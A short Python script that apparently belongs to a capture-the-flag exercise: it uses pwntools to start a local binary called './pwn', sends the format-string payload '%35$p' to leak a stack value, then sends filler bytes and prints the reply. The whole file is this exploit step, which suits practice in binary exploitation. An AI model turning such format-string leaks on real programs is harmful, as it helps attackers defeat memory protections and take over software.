from pwn import *

exe = './pwn'
elf = ELF(exe)

context.binary = elf

p = process(exe)

p.recvuntil(b'Dark Magic is here!\n')

payload = f"%35$p"
p.sendline(payload.encode())

time.sleep(0.1)
p.sendline(b'AAAAAAAA')

response = p.recvline().strip().decode()
print(response)
p.close()